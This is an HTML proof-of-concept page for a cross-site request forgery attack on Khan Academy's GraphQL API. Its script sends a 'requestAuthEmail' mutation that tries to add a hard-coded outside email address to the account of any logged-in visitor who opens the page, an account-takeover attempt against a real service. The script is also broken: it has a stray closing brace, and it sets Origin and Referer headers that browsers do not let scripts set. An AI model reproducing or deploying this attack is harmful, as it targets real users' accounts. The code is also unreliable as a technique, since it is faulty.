<!DOCTYPE html>
<html>
<head>
    <title>CSRF PoC for GraphQL</title>
</head>
<body>
    <h1>CSRF PoC for GraphQL Mutation</h1>
    
    <script>
        // Prepare the payload
        const payload = {
            "operationName": "requestAuthEmail",
           "variables": {
                "authEmail": "awyea1652@gmail.com"
            },
            "query":"mutation requestAuthEmail($authEmail: String!) {\n  requestAuthEmail(authEmail: $authEmail) {\n    user {\n      id\n      pendingEmails\n      __typename\n    }\n    error {\n      code\n      __typename\n    }\n    __typename\n  }\n}"}
        };

        // Make the POST request to the target endpoint
        fetch('https://www.khanacademy.org/api/internal/graphql/requestAuthEmail?lang=en&_=240807-1626-6591bfdb76a6_1723114619016', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-Ka-Fkey': '1',
                'Referer': 'https://www.khanacademy.org/settings/account',
                'Origin': 'https://www.khanacademy.org'
            },
            body: JSON.stringify(payload)
        })
        .then(response => response.json())
        .then(result => console.log('Success:', result))
        .catch(error => console.error('Error:', error));
    </script>
</body>
</html>
